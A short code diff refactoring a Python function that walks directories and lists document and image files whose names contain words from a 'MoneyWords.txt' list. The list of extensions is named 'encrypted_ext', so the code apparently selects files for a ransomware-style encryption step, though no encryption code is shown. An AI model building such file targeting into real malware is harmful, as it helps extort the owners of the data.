@@ -11,15 +11,13 @@ def generate_file_list(path):
     encrypted_ext = ('.txt','.pdf','.docx','.doc','.png','.jpg','.jpeg')
     file_paths = []
     rfile = open('MoneyWords.txt', 'r')
-    words = []
-    for line in rfile:
-        words.append(line[:-1])
+    words = [line[:-1] for line in rfile]
     for root, dirs, files, in os.walk(path):
         for file in files:
             for w in words:
                 file_name,file_ext = os.path.splitext(root+'\\'+file)
-                if w in ''.join([c for c in file_name.lower() if c.islower()]):
-                    if file_ext in encrypted_ext:
+                if w in ''.join([c for c in file_name.lower() if c.islower()]) and file_ext in encrypted_ext:
+
                         file_paths.append(root+'\\'+file)
     print(file_paths)
     return file_paths
